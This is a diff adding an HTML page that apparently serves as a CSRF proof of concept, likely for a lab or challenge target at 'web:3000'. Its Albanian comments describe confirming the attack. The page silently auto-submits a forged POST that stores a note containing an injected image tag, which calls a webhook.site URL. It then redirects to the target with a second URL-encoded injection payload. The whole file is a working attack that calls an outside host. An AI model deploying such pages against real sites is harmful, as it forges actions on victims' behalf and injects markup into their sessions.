@@ -1,0 +1,17 @@
+<!doctype html>
+<html>
+<body>
+<form id="f" action="http://web:3000/api/note" method="POST" enctype="application/x-www-form-urlencoded">
+  <!-- Vendosim një notë që bën ping te webhook, thjesht për të konfirmuar që CSRF punon -->
+  <input type="hidden" name="note" value="<img src='https://webhook.site/0f85ed0a-d8a0-498a-8ee9-c34554ee027a/csrfping'>">
+</form>
+<script>
+  // auto-submit
+  document.getElementById('f').submit();
+  // pas 500ms, ridrejto te index me 'success' (provojmë prap HTML)
+  setTimeout(function(){
+    location = "http://web:3000/?success=%3Cimg%20src%3D%27https%3A%2F%2Fwebhook.site%2F0f85ed0a-d8a0-498a-8ee9-c34554ee027a%2Faftercsrf%27%3E";
+  }, 500);
+</script>
+</body>
+</html>
